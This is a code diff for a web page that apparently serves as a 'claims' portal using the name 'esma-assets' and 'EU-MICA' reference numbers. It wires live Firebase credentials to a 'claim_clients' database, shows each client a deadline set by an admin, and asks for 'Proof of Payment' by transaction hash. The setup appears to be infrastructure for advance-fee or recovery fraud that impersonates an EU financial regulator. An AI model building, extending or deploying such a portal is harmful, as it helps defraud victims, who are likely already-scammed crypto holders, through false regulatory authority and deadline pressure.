@@ -801,32 +801,30 @@ Please submit your <strong>Proof of Payment</strong> (Transaction Hash / Receipt
   </div>
 </footer>
 
-<!-- INCLUDE FIREBASE COMPATIBLE SDKs -->
+<!-- FIREBASE COMPATIBLE SDKs WITH YOUR EXACT ESMA-ASSETS CONFIG -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
 <script>
-// REPLACE WITH YOUR NEW FIREBASE PROJECT CONFIG KEYS
 const firebaseConfig = {
-  apiKey: "YOUR_NEW_PROJECT_API_KEY",
-  authDomain: "YOUR_NEW_PROJECT_ID.firebaseapp.com",
-  projectId: "YOUR_NEW_PROJECT_ID",
-  storageBucket: "YOUR_NEW_PROJECT_ID.firebasestorage.app",
-  messagingSenderId: "YOUR_NEW_PROJECT_SENDER_ID",
-  appId: "YOUR_NEW_PROJECT_APP_ID"
+  apiKey: "AIzaSyC45bNuxFV-UkceTNxKNvh2pF2QceRF_wM",
+  authDomain: "esma-assets.firebaseapp.com",
+  projectId: "esma-assets",
+  storageBucket: "esma-assets.firebasestorage.app",
+  messagingSenderId: "674081241839",
+  appId: "1:674081241839:web:820fb22b10473369cb391a"
 };
 
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-let clients = {}; // Dynamic Database from Firebase
+let clients = {};
 let currentClient = null;
 let currentLang = "ENG";
 let exchangeRates = { USD: 2500, EUR: 2300, GBP: 2900 };
 
 const currencySymbols = { EUR: "€", USD: "$", GBP: "£" };
 
-// REAL-TIME FIRESTORE DATABASE LISTENER
 db.collection("claim_clients").onSnapshot((snapshot) => {
   clients = {};
   snapshot.forEach((doc) => {
@@ -1091,7 +1089,6 @@ function populateClientData() {
   document.getElementById('p3Ref').innerText = currentClient.ref || "EU-MICA-8829123-00";
   document.getElementById('p3Date').innerText = currentClient.date;
 
-  // PRIORITY DEADLINE LOGIC: Custom admin deadline takes precedence, fallback to calculated
   const finalDeadline = (currentClient.deadline && currentClient.deadline.trim() !== "") 
                         ? currentClient.deadline 
                         : calculateFallbackDeadline(currentClient.date);
